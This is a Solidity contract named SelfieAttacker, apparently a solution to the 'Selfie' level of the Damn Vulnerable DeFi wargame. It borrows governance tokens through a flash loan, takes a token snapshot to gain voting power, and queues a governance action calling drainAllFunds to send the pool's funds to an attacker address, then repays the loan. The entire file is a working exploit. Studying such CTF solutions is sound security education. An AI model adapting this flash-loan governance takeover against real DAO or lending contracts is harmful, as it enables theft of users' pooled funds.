// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./SimpleGovernance.sol";
import "./SelfiePool.sol";


contract SelfieAttacker {

    ERC20Snapshot public token;
    SelfiePool private immutable pool;
    SimpleGovernance private immutable governance;
    address payable attacker;
    uint256 public actionId;

    constructor (address tokenAddress, address poolAddress, address governanceAddress, address attackerAddress) {
        token = ERC20Snapshot(tokenAddress);
        pool = SelfiePool(poolAddress);
        governance = SimpleGovernance(governanceAddress);
        attacker = payable(attackerAddress);
    }

    function attack(uint256 amount) external {
        pool.flashLoan(amount);
    }

    function receiveTokens(address tokenAddress, uint256 amount) external {
        DamnValuableTokenSnapshot governanceToken = DamnValuableTokenSnapshot(tokenAddress);
        governanceToken.snapshot();
        actionId = governance.queueAction(address(pool), abi.encodeWithSignature(
            "drainAllFunds(address)",
            attacker
            ), 0);
        token.transfer(msg.sender, amount);
    }

    receive() external payable {}
}

